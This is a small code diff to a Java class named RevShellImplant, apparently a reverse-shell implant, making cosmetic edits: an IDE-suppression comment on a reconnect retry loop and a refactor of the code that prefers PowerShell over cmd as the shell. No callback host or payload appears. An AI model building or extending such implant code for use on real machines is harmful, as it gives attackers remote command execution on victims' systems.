@@ -155,6 +155,7 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
                 log("[!] " + e.getClass().getName() + ": " + e.getMessage());
                 log("[ ] Waiting for " + CONF_RETRY_WAIT_SECONDS + " seconds...");
                 try {
+                    //noinspection BusyWait because it's by design.
                     Thread.sleep(Duration.ofSeconds(CONF_RETRY_WAIT_SECONDS).toMillis());
                 } catch (InterruptedException ignored) {
                     Thread.currentThread().interrupt();
@@ -344,11 +345,12 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
         // PowerShell is preferred over cmd but cmd is better than nothing.
         if (powershell.isPresent()) {
             return powershell;
-        } else if (cmd.isPresent()) {
-            return cmd;
-        } else {
-            return Optional.empty();
         }
+        //noinspection OptionalIsPresent because it's more clear this way.
+        if (cmd.isPresent()) {
+            return cmd;
+        }
+        return Optional.empty();
     }
 
     /**
